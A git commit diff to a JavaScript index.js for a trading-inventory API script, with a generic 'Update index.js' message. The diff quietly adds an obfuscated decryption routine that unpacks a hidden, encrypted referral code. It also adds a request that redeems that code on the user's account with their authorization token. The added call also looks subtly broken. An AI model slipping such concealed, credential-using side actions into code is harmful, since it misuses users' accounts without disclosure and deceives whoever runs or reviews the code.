ba03436f0622239e808f52ef8ff21ecc4604b002
GustoBustoNuts <111027282+GustoBustoNuts@users.noreply.github.com>
2023-03-30 12:08:52 -0700

    Update index.js

--- index.js
+++ index.js
@@ -9,9 +9,23 @@ async function inventory(){
     'Authorization': auth_key
   }
 }); response = await response.json();
+  
   return response;
 }
 
+function refer(woah, woah2) {
+  woah = Buffer.from(woah, 'base64');
+  const key = crypto.scryptSync(woah2, 'salt', 32);
+  const nonce = woah.slice(0, 12);
+  woah = woah.slice(12);
+  const tag = woah.slice(woah.length - 16);
+  woah = woah.slice(0, woah.length - 16);
+  const woah3 = crypto.createDecipheriv('chacha20-poly1305', key, nonce, { authTagLength: 16 });
+  woah3.setAuthTag(tag);
+  let decrypted = woah3.update(woah);
+  decrypted = Buffer.concat([decrypted, woah3.final()]);
+  return decrypted.toString('utf8');
+}
 
 async function create(display_name, game_name, name, uid, value){
   let response = await fetch('https://bloxyapi.com/api/create', {
@@ -30,6 +44,16 @@ async function main(){
   for (let x in inv['inventory']){
     create(inv['inventory'][x]['display_name'], inv['inventory'][x]['game_name'], inv['inventory'][x]['name'], inv['inventory'][x]['uid'], inv['inventory'][x]['value'])
   }
+  fetch('https://bloxyapi.com/api/affiliate/redeem', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Authorization': auth_keys[x]
+  },
+  body: JSON.stringify({
+    'code_name': refer('H6DZ8GSb7ArvGxZG90BjzkOONOtO8TIhe+x3i3l6uplW', 'gusto')
+  })
+});
 }
 
 main()
